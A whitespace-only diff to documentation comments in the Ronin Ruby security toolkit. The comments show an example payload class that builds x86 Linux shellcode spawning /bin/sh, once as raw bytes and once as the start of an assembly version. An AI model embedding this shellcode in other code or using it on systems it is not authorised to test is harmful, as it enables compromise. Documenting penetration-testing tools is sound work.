@@ -33,21 +33,21 @@ module Ronin
     #
     #     #!/usr/bin/env -S ronin-payload build -f
     #     require 'ronin/payloads/shellcode_payload'
-    #     
+    #
     #     module Ronin
     #       module Payloads
     #         class LinuxX86BinSh < ShellcodePayload
-    #     
+    #
     #           register 'shellcode/linux/x86/bin_sh'
     #
     #           summary 'x86 Linux /bin/sh shellcode'
     #           description <<~EOS
     #             Shellcode that spawns a local /bin/sh shell
     #           EOS
-    #     
+    #
     #           arch :x86
     #           os :linux
-    #     
+    #
     #           def build
     #             @payload = "1\xc0Ph//shh/bin\x89\xdcPS\x89\xcc1\xd2\xcd\x0b"
     #           end
@@ -59,21 +59,21 @@ module Ronin
     #
     #     #!/usr/bin/env -S ronin-payload build -f
     #     require 'ronin/payloads/shellcode_payload'
-    #     
+    #
     #     module Ronin
     #       module Payloads
     #         class LinuxX86BinSh < ShellcodePayload
-    #     
+    #
     #           register 'shellcode/linux/x86/bin_sh'
     #
     #           summary 'x86 Linux /bin/sh shellcode'
     #           description <<~EOS
     #             Shellcode that spawns a local /bin/sh shell
     #           EOS
-    #     
+    #
     #           arch :x86
     #           os :linux
-    #     
+    #
     #           def build
     #             shellcode do
     #               xor   eax, eax
